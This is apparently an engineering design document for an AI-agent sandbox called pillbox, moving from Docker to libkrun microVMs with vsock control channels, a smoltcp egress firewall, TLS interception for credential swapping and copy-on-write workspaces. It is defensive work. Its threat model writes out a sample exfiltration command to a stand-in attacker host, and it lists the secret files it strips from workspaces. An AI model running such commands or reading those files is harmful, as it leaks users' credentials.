# libkrun sandbox — the substrate pivot (Docker → microVM)

**Status:** direction / spec (not yet built). Supersedes the Docker-daemon local
backend and the whole remote-backend line ([remotes-redesign.md](./archive/remotes-redesign.md),
[remotes.md](./archive/remotes.md) — now deprecated).

## Why

Docker was chosen for one reason: **VPS ubiquity for the remote plane.** That
reason is gone — "remote" resolved to *Cloudflare-managed* or *pillbox-running-
locally-on-the-VPS* (see [vnext.md](./vnext.md)), neither of which needs a
local Docker daemon driven over SSH. With the remote rationale removed, the
local runtime is free to be the *best* one instead of the most *compatible* one.

[libkrun](https://github.com/containers/libkrun) is that runtime:

- **Secure** — the isolation boundary is a **VM** (KVM on Linux, Hypervisor.
  framework on macOS), not a shared kernel. This turns the pitch's first word
  from aspirational to real: safe to run a prompt-injected agent. (Today's
  threat model explicitly does *not* defend against container escape.)
- **Fast / small** — sub-100ms boot, tiny footprint, **no daemon** (a linked
  library + a spawned helper, not `dockerd` / Docker Desktop). No-daemon finally
  *matches* pillbox's identity instead of fighting it.
- **macOS-native** — HVF microVMs directly, no Docker Desktop (which is itself a
  hidden Linux VM running containers; libkrun is the leaner direct path).

**We own it, we don't fork it.** libkrun is an LGPL *library*; we FFI its C API
(`include/libkrun.h`) and depend on the `libkrunfw` kernel artifact — a normal
library dependency, no vendored or forked third-party code. The sandbox is
table-stakes; **the layer above — drive-from-chat + great telemetry — is what's
ours**, and owning the substrate is what keeps that layer's channel clean (see
[§ Channels](#channels)).

## Architecture

```
host: pillbox  ──FFI──▶ libkrun (KVM/HVF microVM)
   │                       │
   │  vsock (control)      ├─ virtio-fs ← workspace (COW snapshot)
   │  ◀───────────────────▶│  pillbox-init (PID 1): runs the agent,
   │  frames + §0 events    │              speaks the control channel
   │                       │
   └─ smoltcp egress stack ◀─ virtio-net ← agent's internet
      (vault v2 + egress firewall + telemetry)
```

- **`pillbox-init`** — a small Rust binary, PID 1 in the guest. Boots, execs the
  agent (or `opencode serve`), and exposes the control channel. The natural home
  for the in-guest half of the frame protocol + the §0 event producer.
- **Rootfs** — an OCI image works as the microVM rootfs (krunvm/crun-krun
  style), so the existing runner-image artifact survives the pivot; a slimmer
  custom rootfs is an option later.
- **Workspace** — host dir shared via **virtio-fs**; a **COW snapshot**
  (FICLONE / `clonefile(2)`) gives near-instant per-run isolation and is the
  clean local "fork N agents from one base" primitive. rustic stays the
  *durable / cross-machine* store; COW is the *fast local fork*. They compose.

### Channels

Two **separate** channels — do not conflate:

- **Control (`pillbox-init` ↔ host): frame protocol + §0 events → vsock.**
  virtio-vsock is the purpose-built host↔guest pipe, independent of the guest's
  internet. *Open question (resolved):* vsock-on-HVF via libkrun could have been
  finicky — prototype it first, fall back to a forwarded localhost socket if
  needed. `pillbox-init` doesn't care which. (It worked; see step 2.)
- **Egress (the agent's internet) → a userspace TCP stack ([smoltcp](https://github.com/smoltcp-rs/smoltcp)).**
  libkrun offers TSI (zero-config socket impersonation, simplest boot, little
  control) vs **virtio-net + a host-side userspace stack** that **terminates the
  guest's connections in userspace**. That termination point is exactly where the
  **vault, the egress firewall, and network telemetry** live, so owning it
  serves all three priorities. Boot on TSI; move egress to smoltcp when wiring
  vault/egress/telemetry (i.e. early).

**The convergence:** the two differentiators — *drive from Slack/Discord/chat*
and *great telemetry* — ride the **same** `pillbox-init` channel: `send` →
control → agent (drive); agent events → control → host → §0 log / OTLP
(telemetry). One owned channel, both jobs. That is the concrete reason to own
the substrate rather than rent a sandbox SDK.

## Security model (by axis)

- **Network / credentials** (vault v2): default-deny egress allowlist +
  **credential substitution gated on SNI + DNS-pin** (the real key is swapped in
  only when the SNI is allowlisted AND the destination IP is in the sandbox's own
  DNS-answer set for that host; the agent never sees the key). A direct upgrade to
  today's blind stub-swap, living in the smoltcp egress stack. We **MITM for
  *substitution*** (provider hosts) and **fence** (default-deny + DNS) for
  non-provider egress — see
  [§ Why MITM](#why-mitm-at-all--substitute-vs-fence-2026-06-01-review).
- **Filesystem / workspace**: COW snapshot + **non-negotiable secret-file
  exclusion** (`.env*`, `*.pem`, `.ssh/`, `.aws/` — an untrusted repo's config
  cannot negate it) + multi-layer policy where an untrusted repo **cannot widen**
  egress or loosen a security setting.
- **Egress profiles**: `permissive` / `standard` / `locked` — great UX,
  orthogonal to the review gate.
- **Diff-review-before-flush is OPTIONAL** — a blocking human gate before every
  flush fights pillbox's driven/chat/autonomous priority. *Interactive* mode may
  offer it; *driven* mode uses COW + snapshot-and-pull.

## What survives the pivot (most of the recent work)

The §0 / attach / opencode work is **transport-agnostic at its core**, so it
ports by swapping only the bottom:

| Layer | Survives unchanged | Changes |
|---|---|---|
| §0 log, event mapper, `drain_sse`, synth | ✅ (consume a `Read`/payloads) | — |
| frame protocol, `session send/watch/subscribe`, pump | ✅ surface | transport: `docker exec` → vsock |
| opencode integration | ✅ the `message.*` mapper (the brain) | bridge: `docker exec curl` → vsock / guest-net |
| vault | ✅ concept | sidecar-in-container → smoltcp egress proxy (vault v2) |
| sandbox backend | — | `local_docker` + `docker::` → a `libkrun` backend |

## Superseded / deprecated by this pivot

- **Local Docker backend** (`sandbox/local_docker.rs`, `docker.rs`) → a libkrun
  backend. Code currently ships; deprecated in direction.
- **Remote backends** — `docker://`, `ssh://`, `e2b://` (`remote_docker`,
  `remote_ssh`, `remote_e2b`) and [remotes-redesign.md](./archive/remotes-redesign.md).
  "Remote" is now Cloudflare-managed or pillbox-local-on-the-box; the SSH-driven-
  daemon model is retired. Code currently ships; deprecated in direction.
- The Docker **runner image** framing in [runner-image.md](./runner-image.md) →
  microVM rootfs (OCI still usable).

## Proven recipe — macOS boot (2026-06-01) ✅

Step 1 done: a Linux 6.12.76 microVM boots on macOS 26 (Apple Silicon, HVF) via
Rust→libkrun FFI and runs a command in an Alpine rootfs. The working recipe
(proof crate at `~/code/libkrun-boot`, kept out of this repo until it graduates
into a `pillbox-krun` backend):

- **Install:** `brew install slp/krun/libkrun` (bottled; pulls `libkrunfw`).
- **FFI:** hand-written `extern "C"` — no bindgen needed for the minimal surface:
  `krun_create_ctx` → `krun_set_vm_config(ctx, vcpus, ram_mib)` →
  `krun_set_root(ctx, rootfs_dir)` → `krun_set_workdir` →
  `krun_set_exec(ctx, path, argv_after_0, envp)` → `krun_start_enter` (never
  returns; guest stdout streams to the host; process exits with the guest's status).
- **Rootfs:** a plain directory works as the virtio-fs root — an extracted OCI/
  Alpine `minirootfs` tarball is enough (OCI-image-as-rootfs confirmed viable).
- **macOS gotcha (the time-sink):** libkrun `dlopen`s a *bare* `libkrunfw.5.dylib`
  via `libloading`. macOS 26 does **not** resolve it via `DYLD_LIBRARY_PATH`
  (stripped/ignored even for linker-adhoc binaries) nor the `$HOME/lib` fallback.
  It resolves against the **main executable's `LC_RPATH`** — so the consumer
  binary needs `-Wl,-rpath,/opt/homebrew/lib`. Build it in `build.rs`.
- **HVF entitlement:** the binary must be codesigned with
  `com.apple.security.hypervisor`:
  `codesign -f --entitlements ent.plist -s - <binary>` (ad-hoc is fine; `cargo`
  re-signs the binary each build, so re-sign after every `cargo build`).
- **vsock-on-HVF: WORKS** (step 2, below) — no SSH fallback needed.

### Control channel (step 2, proven) ✅

`pillbox-init` (the guest workload) → host frame round-trip over vsock, on HVF:

- **Host:** `krun_add_vsock_port(ctx, PORT, "/tmp/pillbox-ctrl.sock")` — default
  direction is *guest connects out, host listens*. The host `UnixListener::bind`s
  that path **before** `krun_start_enter`; libkrun connects to it when the guest
  dials the vsock port. (`krun_add_vsock_port2(..., listen=true)` flips it: guest
  listens, host initiates — use that later if the host should attach on demand.)
- **Guest:** `socket(AF_VSOCK)` → `connect({ cid: VMADDR_CID_HOST=2, port: PORT })`
  → write the length-prefixed frame. Retry the connect (~5s) since the host
  listener races boot.
- **Guest binary:** `pillbox-init`, cross-compiled to
  `aarch64-unknown-linux-musl` (static, `libc` for AF_VSOCK) with
  `CARGO_TARGET_AARCH64_UNKNOWN_LINUX_MUSL_LINKER=rust-lld` — no external gcc;
  copied into the rootfs and set as `krun_set_exec` target.
- **Note:** the exec'd binary is the guest *workload*, not literally PID 1 —
  libkrun runs its own internal init and spawns our process as a child. So
  `pillbox-init` doesn't need full-init duties; it just owns the agent + the
  control channel and parks while serving.

### Attach port (step 3, proven) ✅

The **real** `Frame` attach protocol round-trips over the vsock channel on HVF —
the docker→vsock swap is the bottom byte-pipe only; codec + lifecycle unchanged.

- **Codec is production, not a stand-in:** `src/attach/frame.rs` is vendored
  *verbatim* into the proof crate (`shared/frame.rs`) and compiled by both ends.
- **Guest = pty-host role** (mirrors `src/attach/host.rs`): `pillbox-init`
  `forkpty`s `/bin/sh`, sends a `Snapshot` on connect, streams PTY output as
  `Data`, applies `Input`→PTY and `Resize`/`Hello`→`TIOCSWINSZ`, and reaps the
  child to send `Exit(code)`. No new deps — raw `libc::forkpty` (cross-builds to
  aarch64-musl with rust-lld, no gcc).
- **Host = pump role** (mirrors `src/attach/pump.rs`): `Hello` → read
  `Snapshot`/`Data` → send one `Input` → read `Exit`.
- **fd-type gotcha:** the vsock fd is a real `SOCK_STREAM` socket, so wrapping it
  in `UnixStream::from_raw_fd` works (std uses `recv`/`send`). The **PTY master
  is not a socket** — wrap it in `File` (uses `read`/`write`); a `UnixStream`
  there `ENOTSOCK`s.
- **Proof asserts execution, not echo:** the host types `echo READY-$((6*7));
  exit` and asserts `READY-42` comes back — `42` is absent from the typed line,
  so it proves the guest shell *evaluated* the input (full bidirectional path),
  not that the terminal echoed it. `exit_code=0`, clean teardown.

### §0 producer (step 4, proven) ✅

The structured §0 control plane streams over a **second, concurrent** vsock port
(1025) alongside the attach data plane (1024) — the two-channel design the
architecture diagram calls for, now proven to coexist on libkrun.

- **Two ports, concurrent:** the host calls `krun_add_vsock_port` per port; the
  guest dials both. The binary `Frame` PTY stream and the §0 NDJSON stream
  interleave on the wire without interference (separate streams) — that was the
  open transport question, now closed.
- **Real contract types, both ends:** `src/contract.rs`'s `Event`/`Payload` are
  vendored into `shared/contract.rs`; the guest serializes via the real
  `Event::session(...)` builder, the host deserializes into the real types. The
  wire is the exact production shape (camelCase fields, snake_case `type` tags,
  RFC3339 `at` from the `time` crate).
- **Host is the seq authority:** producers emit `seq == 0`; the host stamps the
  monotonic per-session `seq` on append, mirroring `SessionLog::append`.
- **Durable spine round-trips:** the host persists `log.jsonl` (byte-for-byte the
  `SessionLog` on-disk form — droppable at `<pillbox>/sessions/<id>/log.jsonl`
  and `session watch`/`subscribe` read it unchanged), then replays it: 8 events
  re-parse, seqs gap-free `1..N`. That's the read surface the gateway sits on.
- **What changes at graduation:** swap the proof's flat-file drain for the real
  `SessionLog` (seq + notify-follow already built, transport-agnostic); the guest
  half is the event mapper (`drain_sse` / transcript tailer) feeding this port.

## Egress + vault v2 (step 5 — design)

This is the **novel** step — not a port of existing logic like 3/4, and the one
that makes the pitch's first word (*secure* — safe to run a prompt-injected
agent) real beyond VM isolation. It's the hardest piece in the plan, so it gets
a design before a spike.

### The networking decision: boot on TSI, egress on virtio-net + smoltcp

libkrun offers two ways to give the guest a network:

- **TSI** (Transparent Socket Impersonation) — libkrun proxies the guest's
  socket syscalls through the *host kernel's* sockets. Zero-config, simplest
  boot. But the host kernel makes the real connections, so pillbox gets **no
  userspace termination point it controls** — nowhere to gate, MITM, or measure.
  Fine for "just give it internet"; useless for vault v2.
- **virtio-net + a host-side userspace TCP stack ([smoltcp](https://github.com/smoltcp-rs/smoltcp))**
  — the guest sees a real NIC; its packets land in a stack **pillbox owns and
  terminates in userspace**. That termination point is the single control plane
  for all three priorities (gate, vault, telemetry).

**Decision:** boot on TSI (steps 1–4 don't need egress); switch to
virtio-net + smoltcp *in this step*, because every vault-v2 control lives at
that userspace termination point. Egress is the reason to own the stack.

### Three egress tiers at the termination point

Every guest-initiated connection hits the smoltcp stack; pillbox reads the TLS
**ClientHello SNI** at connect time and routes to one of three tiers:

1. **Provider host** (`api.anthropic.com`, `api.openai.com`, `github.com` for the
   token, …) → **MITM-terminate** with the per-pillbox CA (guest already trusts
   it), hand the plaintext `Request`/`Response` to **today's `VaultProvider`
   stack unchanged** (stub→real out, real→stub in, rotate-token persist), and
   emit gen_ai/usage telemetry. The provider logic is hyper-level and survives
   the pivot verbatim — only its *substrate* moves (sidecar + `HTTPS_PROXY` →
   smoltcp).
2. **Allowlisted non-provider host** (per profile: package registries, git
   hosts, …) → **TCP pass-through**, no MITM (no credential to swap, so no cert
   trust needed — the guest sees the real upstream cert). Allowed, but only SNI/
   byte-count telemetry, never plaintext.
3. **Everything else** → **default-deny**: RST at connect. This is the
   exfiltration guard today's proxy lacks (`vault/server.rs` passes unmatched
   hosts through unmodified). An injected agent's `curl evil.com -d @secret`
   never opens a socket.

### The two hardening gates v2 adds over today's blind swap

Today's swap is keyed on the *claimed* host and releases the real credential to
whatever that host resolves to. v2 adds:

- **Default-deny allowlist** (tier 3 above) — egress is closed by default; the
  agent reaches only what the profile permits. This is also the **prerequisite
  for cross-user pooling**: the [swarm-memory](./swarm-memory.md) scrub is
  zero-false-negative only when *all* egress is inspected, which only holds once
  unmatched hosts can't slip out (see [security.md](./security.md)).
- **Destination-pinned credential release (DNS-pin)** — the real key is injected
  only when **the TLS SNI matches an allowlisted host AND the connection's
  destination IP is in the DNS-answer set the *sandbox's own* lookup returned for
  that host**. Binds the credential to a **proven** destination, defeating DNS
  spoofing / a hijacked `api.anthropic.com` / "spoof the SNI, connect to an
  attacker IP". It **supersedes the spike's `verify_upstream`** (a second,
  blocking TLS handshake to the real host — which the quality review flagged for
  stalling the poll loop): DNS-pin is cheaper (no second handshake), non-blocking,
  and equally strong — snoop the guest's DNS answers at the stack, pin the IPs
  (TTL-bounded), gate on them.

### Why MITM at all — substitute vs. fence

There is **no credential-injection route that avoids terminating TLS** — the
credential lives in the encrypted body, so rewriting it is inherently
decrypt-modify-re-encrypt. The genuine architectural fork is **substitute** vs.
**fence**:

- **Substitute (MITM)** — the guest only ever sees a stub; rotation never reaches
  it. Cost: CA injection into the guest trust store; cert-pinned clients need an
  explicit bypass list.
- **Fence (no substitution)** — real creds live in the guest, safety comes purely
  from default-deny egress + DNS-pinned allowlist + secret-file exclusion.
  Simpler, no CA, immune to pinning — but the agent's process holds the real key
  and rotated OAuth tokens reach the guest.

**Decision: MITM stays**, scoped to provider hosts (tier 1). Pillbox's threat
model is an untrusted/prompt-injected agent making *arbitrary* egress, and the
**subscription/OAuth keystone requires that refresh-token rotation never leak
back to the guest** — both point to substitution. We use the *fence* as the floor
for **non-provider** hosts (tiers 2–3), so it isn't either/or: fence everything,
MITM only where a credential is injected.

**Considered and deferred — base-URL override**: point the agent's
`ANTHROPIC_BASE_URL` at an explicit local injecting proxy — no CA spoofing, no
cert-pinning risk. Viable since pillbox already injects per-agent env, but it
covers only cooperating SDKs/known hosts (not the agent's `curl`/git/MCP egress)
and the OAuth refresh path is messier. A per-agent friction-reducer layered on
the MITM+fence base, not a replacement.

### Egress profiles

Orthogonal UX over the allowlist; the secret-file exclusion (step 6) is the
filesystem sibling, kept separate.

- **`locked`** — allowlist = provider hosts only. The agent can authenticate and
  nothing else. Maximum safety for fully-untrusted code.
- **`standard`** (default) — providers + a curated dev allowlist (git hosts,
  common package registries).
- **`permissive`** — all egress allowed, but provider hosts are *still*
  MITM+swapped (≈ today's posture). For code you trust.

An untrusted repo **cannot widen** its own profile (non-negotiable) — the
profile is set by the invoker, not the workspace.

### Step-5 spike (proven) ✅ — egress substrate + vault-v2 mechanics

The egress termination point AND the vault-v2 gates exist on HVF, end to end.
Proof binary `netspike` + the guest's `pillbox-init net` branch (proof crate at
`~/code/libkrun-boot`):

- **Phase 1 — frame transport (the make-or-break unknown):** `krun_add_net_unixstream(ctx,
  NULL, fd, mac, features=0, flags=0)` with `fd` one end of a `socketpair`.
  libkrun drives the guest's virtio-net as **passt-protocol** frames —
  `[u32 BE len][raw Ethernet frame]` — to our end. `features=0` disables offloads
  (TSO/CSUM) so each frame is one real ≤MTU Ethernet frame. The guest's ARP
  who-has for the gateway arrived intact. **This is the analogue of "does vsock
  work on HVF" for step 2 — and it does.**
- **Phase 2 — userspace termination:** a host-side **smoltcp** `Interface` over a
  `phy::Device` that pops inbound frames off the socketpair and writes outbound
  ones back (passt-framed). It owns the gateway IP `10.0.2.2/24` + a gateway MAC,
  answers ARP, and **terminates the guest's TCP** — a real in-guest
  `TcpStream::connect` completes against the userspace stack.
- **Phase 3 — DNS-fence + MITM + DNS-pin (the hardened gate):**
  - **DNS fence:** the stack runs a **DNS resolver** on
    UDP `:53` (the guest's `resolv.conf` → `10.0.2.2`). A non-allowlisted name
    gets **NXDOMAIN** — verified: `evil.example.com` → NXDOMAIN, the guest can't
    even resolve it. An allowlisted name resolves (to the proxy IP) and is
    **pinned**.
  - **DNS-pin credential gate:** on TLS, the stack
    drives a `rustls::ServerConnection` off the poll loop and gates on **SNI ∈
    allowlist AND SNI ∈ the DNS-pin set** — a forged-SNI / hardcoded-IP
    connection that skipped our resolver is RST. This **replaced the spike's
    blocking `verify_upstream`** (the 2nd-handshake the review flagged): the pin
    is non-blocking and proves the guest legitimately resolved that exact host.
  - **MITM + swap (kept):** for an allowed+pinned host the guest's busybox
    `wget`+`ssl_client` does a **CA-verified** handshake (trusting our MITM CA at
    `/etc/spike-ca.pem`), the stack decrypts `GET /v1/ping` and **swaps the
    `x-api-key` stub→real** (real never reaches the guest — where the in-repo
    `VaultProvider` plugs in). Guest got `200 ok`, exit 0.
  - **default-deny by-IP (kept):** a direct connect to an IP the stack doesn't
    own (`10.0.2.99`) gets no SYN-ACK → the guest's connect fails.
- **Self-replenishing listener pool:** holds "≥ `POOL_MIN_FREE` sockets in
  LISTEN, capped at `POOL_MAX`" — tops up when a SYN takes a listener, recycles
  fully-closed ones. Scales to concurrent egress connections, not a fixed count.

**Crypto:** `ring`-backed `rustls` + pre-generated test PKI (`certs/`, loaded via
`rustls-pemfile`) — no cmake/aws-lc/C toolchain, no rcgen API churn.

**Still in-repo work (not a substrate unknown):** re-host the *exact* in-repo
`VaultProvider` trait + hudsucker request/response handlers (hyper-level, already
proven); **NAT-forward + splice** the swapped request to the *real* upstream (the
spike resolves allowlisted names to the proxy IP and synthesizes a `200` rather
than forwarding); and **IP-level pin** to the real resolved address (the spike's
pin is name-level — it answers the proxy IP for all allowlisted names). The
mechanics this proves — DNS fence + DNS-pin + MITM + swap on the owned stack —
are end-to-end green. Profiles (`locked`/`standard`/`permissive`) are allowlist
contents over this same gate.

**In-repo-landing checklist (flagged by a 2026-06-01 quality review; deferred
off the throwaway spike, mandatory for the port):**
- **Split `drive_mitm` into seams.** The spike packs TLS-pump (smoltcp↔rustls),
  the SNI gate, the credential swap, and dest-verify into one ~90-line function.
  The port wants three: **(A)** a transport-only TLS pump, **(B)** the policy
  gate (SNI → allow/deny + the verified host), **(C)** request-transform (swap +
  verify + response) where `VaultProvider` injects. Gate runs before the
  plaintext drain so only ALLOW paths pay it.
- **Model the connection as a `MitmPhase` enum**, not the spike's
  `gated`/`handled` bool pair — adding a phase (drain, await-vault) shouldn't mean
  another negated-conjunction check.
- ✅ **DNS-pin replaced `verify_upstream`** (done in the spike: a UDP `:53`
  resolver pins allowlisted names, the TLS gate requires SNI ∈ pin set,
  non-blocking). In-repo, **upgrade to IP-level pin** — resolve allowlisted names
  to their *real* addresses and gate on dest-IP-in-the-resolved-set (the spike
  answers the proxy IP for every allowlisted name, so its pin is name-level).
- ✅ **DNS fence done in the spike** (NXDOMAIN for non-allowlisted names). In-repo,
  add **TTL-bounded IP rules + conntrack** for non-provider tiers so
  MITM stays scoped to provider hosts, plus **NAT-forward** allowlisted
  non-provider hosts to the real upstream (the spike doesn't forward).
- **Event-driven wakeup**, not the spike's fixed 2 ms poll-loop sleep (drive off
  the rx-queue / smoltcp `poll_at`).
- **Give the pin table a type (`PinTable`), not a loose `pins: HashSet`.** It's
  the contract between the resolver and the gate; model it explicitly with
  `record(name, ips, ttl)` / `authorized(sni, dest_ip, now)` / `evict_expired` —
  which also *is* the TTL + IP-level-binding upgrade. The single poll loop is
  **correct** for smoltcp (one `poll()` advances all sockets) — don't split it
  into threads; just lift the pin table out of the loop body into its own type.
  The DNS-before-gate ordering is fail-closed (an unpinned SNI is RST), so it's
  safe, not a hazard.
- **The egress stack is per-sandbox, and the sandbox is the trust unit.** One
  stack + one `PinTable` + one vault + one poll loop per microVM. This is what
  makes multiplayer safe *and* scalable: fork-N = N independent loops (horizontal,
  no contention), and the trust boundary lines up with the credential/pin
  boundary. **Never share one egress stack across trust domains** — that both
  leaks A's pins/creds to B's connections *and* creates the only real god-loop
  bottleneck. Multiplayer-in-one-box = mutually-trusting collaborators sharing a
  workspace + its creds; mutual distrust = separate sandboxes (free under this
  model). A **managed multi-tenant tier** (a shared egress gateway fronting many
  sandboxes) is a *separate* design — per-tenant pin/vault + fair scheduling +
  multi-threaded — not this single-sandbox loop scaled up.

### Step-6 spike (proven) ✅ — CoW workspace + secret exclusion

The filesystem half of the sandbox, end to end on HVF. Proof binary `wsspike` +
the guest's `pillbox-init ws` branch:

- **Phase 1 — virtio-fs second share (the substrate unknown):**
  `krun_add_virtiofs(ctx, "workspace", host_dir)` attaches a second share; the
  guest mounts it with `mount(2)` fstype `virtiofs` at `/workspace`, reads the
  shared files, and writes back. (The root is the first virtio-fs; this is a
  second, mounted explicitly by the guest.)
- **Phase 2 — CoW clone:** the host shares a **`clonefile(2)`** copy-on-write
  clone of the base workspace, **not the base**. Measured **370µs** — genuinely
  CoW, not a deep copy, so "fork N agents from one base" is ~free. The guest's
  `RESULT.txt` write landed in the clone; the base was untouched (its `.env`
  still there, no `RESULT.txt`).
- **Phase 3 — non-negotiable secret-scrub:** before sharing, the host removes
  `.env*` / `*.pem` / `.ssh/` / `.aws/` from the clone. The denylist is
  pillbox-controlled and **read from nothing in the workspace** — the base's
  `.pillboxinclude` asking to keep `.env` was visible to the guest but had **zero
  effect** (the `.env` was gone). Kept files (`src/app.py`, `README.md`) survived.
- **Phase 4 — diff/flush:** `diff(clone, base)` = the guest's `RESULT.txt` — the
  result surface a driven run flushes/snapshots, with the base as the fork point.

**In-repo landing:** rustic snapshot of the result (the durable/cross-machine
store; CoW is the fast *local* fork — they compose); overlayfs CoW for Linux
hosts (`clonefile` is APFS/macOS); the fork-N fan-out from one base.

## Build order (proof-first)

1. ✅ **Boot proof** — done. FFI = hand-written; rootfs = OCI/Alpine dir;
   macOS = rpath + hypervisor entitlement.
2. ✅ **`pillbox-init` + control channel** — done. vsock works on HVF; a frame
   flows guest→host over `krun_add_vsock_port`'s unix-socket bridge.
3. ✅ **Attach port** — done. Production `Frame` protocol (Hello/Snapshot/Data/
   Input/Resize/Exit) round-trips bidirectionally over vsock; guest pty-host +
   host pump, codec vendored verbatim. Recipe above.
4. ✅ **§0 producer** — done. `contract::Event` NDJSON streams over a second
   concurrent vsock port → host seq-authority → durable `log.jsonl` → replay
   verified. Real contract types vendored both ends. Recipe above.
5. **Egress + vault v2** — ✅ spiked incl. hardening (virtio-net→socketpair, smoltcp
   TCP termination, **DNS fence (NXDOMAIN) + DNS-pin gate + MITM + credential swap**
   with the guest doing CA-verified TLS — see [§ Step-5 spike](#step-5-spike-proven----egress-substrate--vault-v2-mechanics)).
   **The in-repo landing is not "done" until every security deliverable below ships
   — they are acceptance criteria, not polish** (full rationale: [§ Why MITM](#why-mitm-at-all--substitute-vs-fence-2026-06-01-review),
   [§ hardening gates](#the-two-hardening-gates-v2-adds-over-todays-blind-swap)):
   - [~] **Default-deny egress** — closed unless the profile allows it (the
     exfiltration guard; also the cross-user-pooling prerequisite). *Spiked via the
     DNS fence (NXDOMAIN) + by-IP drop; in-repo: enforce at the IP/conntrack layer.*
   - [~] **Fence the non-provider tiers**: DNS-snoop allowlist →
     NXDOMAIN (✅ spiked) + TTL-bounded IP rules + conntrack + NAT-forward (in-repo).
   - [~] **DNS-pin credential release**: inject the real key only on
     SNI-allowlisted **AND** dest-IP-in-the-sandbox's-DNS-answer-set. *Spiked at
     name-level (replaced `verify_upstream`); in-repo: upgrade to real-IP pin.*
   - [ ] **Re-host the exact `VaultProvider`/hudsucker handlers** + splice the
     swapped request to the verified upstream (vs the spike's synthesized 200).
   - [ ] **Egress profiles** `permissive`/`standard`/`locked`, and an **untrusted
     repo cannot widen** its own profile (set by the invoker, not the workspace).
   - [ ] **No silent MITM bypass** — a cert-pinned/unmatched host is denied or
     explicitly bypass-listed, never silently passed through with a real cred.
6. **Workspace** — ✅ spiked (see [§ Step-6 spike](#step-6-spike-proven----cow-workspace--secret-exclusion)).
   `clonefile(2)` CoW clone (370µs — fork-N is ~free), **non-negotiable secret-file
   exclusion** (`.env*`/`*.pem`/`.ssh/`/`.aws/` scrubbed from the clone; a repo
   file asking to keep them is ignored), shared into the guest over a second
   **virtio-fs** mount; guest writes land in the clone, base stays the immutable
   fork point. In-repo landing: rustic snapshot of the result (flush/pull);
   overlayfs CoW on Linux hosts (clonefile is APFS-only); the fork-N fan-out.
7. **opencode** — repoint the bridge transport to the control channel, and pay
   down the structural debt a 2026-06-01 review flagged (deferred then because
   fixing it on the *docker* path = polishing code we're deleting):
   - Server-mode is currently modeled as a type (`Integration`) but wired as
     scattered branches (`is_server_agent` / `== Server` in `local_docker::run`,
     `session_send`, `resolve_streaming_session`) grafted onto the local-docker
     PTY backend. Make `Integration` the **dispatch axis**: carry it on the
     `Session` record (typed, like `Backend`), `match` on it exhaustively at
     selection/drive/read, and lift `run_server` out of `local_docker.rs` (it
     isn't "local docker") into its own backend.
   - **Type the bridge on a transport trait, not `DockerEndpoint`.** Today
     `sandbox/opencode.rs` (`send_prompt`/`wait_ready`/`create_session`/
     `spawn_event_bridge`) + `opencode_endpoint` are hard-typed on
     `DockerEndpoint` + `docker exec curl`. Define a small `SandboxExec` seam
     ("run a command in the sandbox / stream its stdout") that docker implements
     today and the libkrun vsock transport implements here — then the swap is the
     1-liner this doc promised, not a cross-file rewrite. The `message.*` mapper +
     `drain_sse` already survive unchanged.
   - Fold the opencode-only `Session` fields (`agent_session_id`, `model`) into a
     typed optional sub-struct so PTY backends stop carrying a `None, None` tail.
8. **Deprecate Docker** — remove the docker/remote backends once libkrun is at parity.

## Dependencies

- [libkrun](https://github.com/containers/libkrun) — the microVM library we FFI
  (LGPL) + its `libkrunfw` kernel artifact.
- [smoltcp](https://github.com/smoltcp-rs/smoltcp) — the userspace TCP/IP stack
  crate for the egress termination point.
- [rustls](https://github.com/rustls/rustls) — TLS for the MITM termination.

## Prior art

Other libkrun-based agent sandboxes, for readers comparing approaches:
[microsandbox](https://github.com/microsandbox/microsandbox),
[brood-box](https://github.com/stacklok/brood-box),
[krunai](https://github.com/slp/krunai). pillbox's substrate, vault, and
§0/attach layers are its own design and implementation; these are credited as
related work in the space, not sources we vendor or fork.
